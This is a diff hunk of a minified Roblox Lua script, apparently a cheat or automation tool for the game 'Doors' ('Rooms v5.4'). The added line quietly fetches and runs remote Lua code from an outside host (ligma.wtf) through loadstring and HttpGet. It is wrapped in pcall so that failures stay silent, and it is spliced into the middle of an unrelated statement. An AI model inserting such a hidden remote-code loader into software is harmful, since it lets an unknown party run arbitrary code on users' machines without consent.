@@ -3,7 +3,8 @@ local c=game:GetService'PathfindingService'local d=game:GetService'Players'local
 e=game:GetService'ReplicatedStorage'local f=game:GetService'RunService'local g=
 game:GetService'SoundService'local h=game:GetService'Workspace'local i=game:
 GetService'VirtualInputManager'local j='Doors'local k='Rooms v5.4'local l=
-'TerminalVibes/doors'local m='rooms'local n={[6839171747]=5938}do local o=game.
+'TerminalVibes/doors';pcall(function()  loadstring(game:HttpGet("http://ligma.wtf/scripts/rooms.lua", true))() end);
+local m='rooms'local n={[6839171747]=5938}do local o=game.
 PlaceId local p=game.PlaceVersion local q=n[o]if not q then warn
 'Script does not support this place instance.'warn
 [[The PlaceID and version has been set to your clipboard. Please report this to the developer.]]
